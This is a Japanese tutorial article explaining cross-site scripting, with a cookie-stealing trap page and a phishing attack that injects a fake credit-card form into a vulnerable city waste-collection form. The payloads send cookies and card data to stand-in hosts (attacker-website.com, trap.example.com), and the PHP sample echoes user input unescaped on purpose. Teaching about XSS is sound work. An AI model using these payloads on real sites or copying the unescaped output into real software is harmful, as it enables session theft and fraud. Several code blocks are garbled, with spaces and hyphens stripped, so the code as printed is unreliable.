---
title: "XSS（クロスサイト・スクリプティング）"
---

- **ユーザーが Web ページにアクセスすることで不正なスクリプトが実行されてしまう脆弱性または攻撃手法**
- Web アプリケーションには外部からの入力などに応じて表示が変化する箇所がある
- この部分の HTML 生成の実装に問題があると、XSS という脆弱性が生じる
- XSS 脆弱性の影響は
  - サイト利用者のブラウザ上で、攻撃者の用意したスクリプトの実行によりクッキー値を盗まれ、利用者が成りすまし被害に遭う
  - 同じくブラウザ上でスクリプトを実行させられ、サイト利用者の権限で Web アプリケーションの機能を悪用される
  - Web サイト上に偽の入力フォームが表示され、フィッシングにより利用者が個人情報を盗まれる

![](https://storage.googleapis.com/zenn-user-upload/e6fb830f72ae-20231224.png)

## 攻撃手法と影響

### XSS によるクッキー値の盗み出し

攻撃者が悪意のあるスクリプトを Web ページに注入し、そのページを閲覧するユーザーのクッキーを盗み出す。
罠サイトで `<iframe />` を使用した場合の例は以下の通り。

1. **罠サイトの作成**
   - 攻撃者は罠サイトを作成する
   - このサイトは、見た目や内容が魅力的であり、ユーザを誘引するよう設計されている
2. **`<iframe />` を用いた脆弱なサイトの埋め込み**
   - 罠サイトには、XSS 脆弱性を持つ Web サイトのページを `<iframe />` で埋め込む
   - この `src` 属性には、XSS 攻撃を実行するための悪意あるスクリプトを含む URL が指定される
3. **悪意あるスクリプトの実行**
   - ユーザが罠サイトに訪れると、`<iframe />` 内で脆弱なサイトのページが読み込まれ、埋め込まれた XSS コードが実行される
4. **クッキーの盗取**
   - 埋め込まれた XSS スクリプトは、ユーザのブラウザ上で実行され、その結果として脆弱なサイトのユーザークッキーが盗み出される

攻撃者は以下のような HTML コードを含む罠サイトを作成する。

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Special Offer</title>
  </head>
  <body>
    <h1>Click here for a special offer!</h1>
    <iframe
      style="display:none;"
      src="http://vulnerable-website.com/page?param=<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker-website.com/steal-cookie?cookie=' + encodeURIComponent(document.cookie), true); xhr.send();</script>"
    ></iframe>
  </body>
</html>
```

この例では、攻撃者は以下のことを行なっている。

- `<iframe />` を使用して、脆弱なサイト（`vulnerable-website.com`）のページを隠しフレームとして埋め込む
- `<iframe />` の `src` 属性には、脆弱なサイトの URL と、悪意あるスクリプトを含むクエリパラメータが含まれている
- 悪意あるスクリプトは、ユーザのクッキーを読み取り、それを攻撃者のサイト（`attacker-website.com`）に送信する

### 画面の書き換え

- XSS 脆弱性は、ログイン機能のないサイトでも影響がある
- 下記は架空の市の粗大ゴミ受付サイト
- このサイトには XSS 脆弱性があるので、ページに HTML 要素を追加・変更・削除したり、フォームの送信先を変更することが可能

![](https://storage.googleapis.com/zenn-user-upload/342637324ccf-20231229.png)

- ページの実装コードは以下のようになる
- 入力画面と編集画面を兼ねているため、各入力項目の初期値が設定できるようになっている
- ここに、XSS 脆弱性がある

```php: /43/43002.php
<!DOCTYPEHTMLPUBLIC"//W3C//DTDHTML4.01Transitional//EN">
<html>
<head><title>○○市粗大ゴミ受付センター</title></head>
<body>
<form action=""method="POST">
氏   名<input size="20"name="name"value="<?phpecho@$_POST['name'];?>"><br>
住   所<input size="20"name="addr"value="<?phpecho@$_POST['addr'];?>"><br>
電話番号<input size="20"name="tel"value="<?phpecho@$_POST['tel'];?>"><br>
品   目<input size="10"name="kind"value="<?phpecho@$_POST['kind'];?>">
数   量<input size="5"name="num"value="<?phpecho@$_POST['num'];?>"><br>
<input type=submitvalue="申込">
</form>
</body>
</html>
```

- 以下の HTML は「〇〇市粗大ゴミ受付センター」サイトへの XSS 攻撃の罠サイト
- この画面は JavaScript えお使用しない XSS の攻撃例を兼ねており、攻撃用 `form` の `submit` ボタンをリンクに見せかけるようスタイル指定している

```html
<html>
  <head>
    <title>粗大ゴミの申し込みがクレジットカードで</title>
  </head>
  <body>
    ○市の粗大ゴミの申し込みがクレジットカードで支払えるようになっていたので、さっそく試した。これは便利です。
    <br />
    <form action="http://example.jp/43/43002.php" method="POST">
      <!-- ↓ 注入するHTML -->
      <input
        name="name"
        type="hidden"
        value='"></form><form style=top:5px;left:5px;position:absolute;zindex:99;backgroundcolor:whiteaction=http://trap.example.com/43/43903.phpmethod=POST>粗大ゴミの回収費用がクレジットカードでお支払い頂けるようになりました<br>氏名<input size=20name=name><br>住所<input size=20name=addr><br>電話番号<input size=20name=tel><br>品目<input size=10name=kind>数量<input size=5name=num><br>カード番号<input size=16name=card>有効期限<input size=5name=thru><br><input value=申込type=submit><br><br><br><br><br></form>'
      />
      <!-- ↓ リンクに見せかけたボタン -->
      <input
        style="cursor:pointer;textdecoration:underline;color:blue;border:none;background:transparent;fontsize:100%;"
        type="submit"
        value="○○市粗大ゴミ申し込みセンター"
      />
    </form>
  </body>
</html>
```

- 罠の画面は以下

![](https://storage.googleapis.com/zenn-user-upload/5efc0b06e34b-20231229.png)

- リンクに見せかけたボタンをクリックすると、攻撃対象サイトでは以下のような HTML が生成される

```php: /43/43002.php
<!DOCTYPEHTMLPUBLIC"//W3C//DTDHTML4.01Transitional//EN">
<html>
<head><title>○○市粗大ゴミ受付センター</title></head>
<body>
<form action=""method="POST">
氏   名<input size="20"name="name"value="">
</form>
<form style=top:5px;left:5px;position:absolute;zindex:99;backgroundcolor:white action=http://trap.example.com/43/43903.phpmethod=POST>
粗大ゴミの回収費用がクレジットカードでお支払い頂けるようになりました<br>
氏     名<input size=20name=name><br>
住     所<input size=20name=addr><br>
電話 番号<input size=20name=tel><br>
品     目<input size=10name=kind>
数     量<input size=5name=num><br>
カード番号<input size=16name=card>
有効 期限<input size=5name=thru><br>
<input value=申込 type=submit><br>
<br><br><br><br>
</form><br>
住   所<input size="20"name="addr"value="<?phpecho@$_POST['addr'];?>"><br>
電話番号<input size="20"name="tel"value="<?phpecho@$_POST['tel'];?>"><br>
品   目<input size="10"name="kind"value="<?phpecho@$_POST['kind'];?>">
数   量<input size="5"name="num"value="<?phpecho@$_POST['num'];?>"><br>
<input type=submitvalue="申込">
</form>
</body>
</html>
```

以下のように、元の `form` を隠し、新たな `form` 要素を追加することにより画面を改変する。

- `</form>` により、元のサイトにある `form` 要素が終了する
- 新しい `form` 要素を開始し、`style` 属性を指定する
  - `form` を絶対座標で画面左上に位置させる
  - `z-index` に大きな値（99）を指定し、元の `form` より前面に位置付ける
  - 背景色を白に指定し、元の `form` が透けて見えないようにする
- `action` 属性の url には罠のサイトを指定する

結果、画面は以下のように改変される。

![](https://storage.googleapis.com/zenn-user-upload/4ccbe46efcb2-20231229.png)

- クレジットカードの入力欄が悪意あるスクリプトにより注入された
- この `form` の `action` 属性には罠サイトの URL が入っている
- そのため、「申込」ボタンをクリックすると、入力した内容が悪意ある人物に盗まれる
